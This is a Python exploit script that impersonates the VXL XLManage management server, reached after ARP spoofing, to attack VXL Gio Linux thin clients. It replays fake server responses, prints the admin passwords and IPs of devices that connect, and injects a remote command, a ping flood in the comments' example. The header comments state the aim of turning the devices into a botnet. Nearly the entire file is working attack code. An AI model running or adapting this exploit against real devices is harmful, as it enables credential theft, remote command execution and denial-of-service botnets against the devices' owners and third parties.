#!/usr/bin/env python
# Exploit to turn embedded devices (VXL Gio Linux thin clients) 
# into a botnet. Use ARP spoofing or similar to hijack the IP
# of the XLManage host, then run this software which simulates
# XLManage and sends a command instruction packet to the drones
# connecting to it. It automatically calculates the checksum for
# the messages. You can only supply 1 command with upto 4 arguements
# using this vulnerability.
#
# Displays any IP of devices that connect and outputs the password 
# for the admin web console. remote exploit can then be used for 
# shell if you are ninja.
#
# Example payload will perform a ping flood using the embedded linux
# devices against 123.123.123.123.
import sys
import os
import socket

phase1 ="HTTP/1.1 200 OK\r\n"\
		"Connection: close\r\n"\
		"Date: Thu, 28 May 2009 10:53:19 GMT\r\n"\
		"Server: Microsoft-IIS/6.0\r\n"\
		"MicrosoftOfficeWebServer: 5.0_Pub\r\n"\
		"X-Powered-By: ASP.NET\r\n"\
		"Content-Type: text/html\r\n\r\n"\
		"<html><head><title>Default MFC Web Server Extension</title></head><body>VXL XLmanage WebServer : \r\n"\
		"Test Successful</body></html>"
		
phase2 ="HTTP/1.1 200 OK\r\n"\
		"Connection: close\r\n"\
		"Date: Thu, 28 May 2009 10:53:19 GMT\r\n"\
		"Server: Microsoft-IIS/6.0\r\n"\
		"MicrosoftOfficeWebServer: 5.0_Pub\r\n"\
		"X-Powered-By: ASP.NET\r\n\r\n"\
		"[RS]\n"\
		"NS=1\n"\
		"VER=0\n"\
		"CRC=26\n"\
		"STATE=0\n"\
		"RT=2\n"\
		"MACID=\n"\
		"RRS=1\n"\
		"[/RS]\n"\
		"[GFCONFIGR]\n"\
		"[/GFCONFIGRS]\n"

phase3 ="HTTP/1.1 200 OK\r\n"\
		"Connection: close\r\n"\
		"Date: Thu, 28 May 2009 10:53:20 GMT\r\n"\
		"Server: Microsoft-IIS/6.0\r\n"\
		"MicrosoftOfficeWebServer: 5.0_Pub\r\n"\
		"X-Powered-By: ASP.NET\r\n\r\n"\
		"[RS]\n"\
		"NS=0\n"\
		"VER=1943158814\n"\
		"CRC=0\n"\
		"STATE=21154712\n"\
		"RT=16\n"\
		"MACID=\n"\
		"RRS=1\n"\
		"[/RS]\n"
		
		
phase4 ="HTTP/1.1 200 OK\r\n"\
		"Connection: close\r\n"\
		"Date: Thu, 28 May 2009 10:53:20 GMT\r\n"\
		"Server: Microsoft-IIS/6.0\r\n"\
		"MicrosoftOfficeWebServer: 5.0_Pub\r\n"\
		"X-Powered-By: ASP.NET\r\n\r\n"\
		"IsProxyServerConfigured=N;PollingTimeOut=30000;\r\n"

phase5 ="HTTP/1.1 200 OK\r\n"\
		"Connection: close\r\n"\
		"Date: Thu, 28 May 2009 10:54:20 GMT\r\n"\
		"Server: Microsoft-IIS/6.0\r\n"\
		"MicrosoftOfficeWebServer: 5.0_Pub\r\n"\
		"X-Powered-By: ASP.NET\r\n\r\n"\
		"[QRS]\n"\
		"ST=Y\n"\
		"[/QRS]\n"
		

phase6 ="HTTP/1.1 200 OK\r\n"\
		"Connection: close\r\n"\
		"Date: Thu, 28 May 2009 10:54:22 GMT\r\n"\
		"Server: Microsoft-IIS/6.0\r\n"\
		"MicrosoftOfficeWebServer: 5.0_Pub\r\n"\
		"X-Powered-By: ASP.NET\r\n\r\n"\
		"[RS]\n"\
		"NS=1\n"\
		"VER=0\n"\
		"CRC="
phase7 ="\nSTATE=0\n"\
		"RT=4\n"\
		"MACID=\n"\
		"RRS=1\n"\
		"[/RS]\n"\

exploit1="[CR]\n"\
		"CT=1\n"\
		"CN="
		
exploit2="\nCP1="

exploit3="\nCP2="

exploit4="\nCP3="
		
exploit5="\nCP4="

exploit6="\n[/CR]\n"

if __name__ == "__main__":
	s = socket.socket()
	s.bind(("0.0.0.0",80))
	s.listen(1)
	print "[ Started vxlgiobye\n"
	while 1:		
		(cli,add) = s.accept()
		data = cli.recv(100000)
		if data.find('GET /VXLServer.dll HTTP/1.1') != -1:
			print "[ phase 1"
			cli.send(phase1)
			cli.close()
		if data.find('POST /VXLServer.dll?RegisterUser HTTP/1.1') != -1:			
			if data.find('ClientName') != -1:
				print "[ phase 2"			
				for i in data.split('\n'):
					if i.find('ClientName') != -1:
						print i				
					if i.find('InternalIP') != -1:
						print i
				cli.send(phase2)
				cli.close()
			else:
				print "[ phase 3"
				for i in data.split('\n'):
					if i.find('PASSWORD') != -1:
						print i								
				cli.send(phase3)
				cli.close()
		if data.find('POST /VXLServer.dll?GetNetworkSettings HTTP/1.1') != -1:
			print "[ phase 4"
			cli.send(phase4)
			cli.close()
		if data.find('POST /VXLServer.dll?QuerySchedules HTTP/1.1') != -1:
			print "[ Client do something!"
			cli.send(phase5)
			cli.close()
		if data.find('POST /VXLServer.dll?SendConductorQRequests HTTP/1.1') != -1:
			print "[ Sending the exploit"
			cmd1 = "/bin/ping"
			cmd2 = "192.168.0.3"
			cmd3 = ""
			cmd4 = ""
			cmd5 = ""
			CRC = len(exploit1+cmd1+exploit2+cmd2+exploit3+cmd3+exploit4+cmd4+exploit5+cmd5+exploit6)
			cli.send(phase6+str(CRC)+phase7+exploit1+cmd1+exploit2+cmd2+exploit3+cmd3+exploit4+cmd4+exploit5+cmd5 +exploit6)
			cli.close()
		else:
			cli.close()
			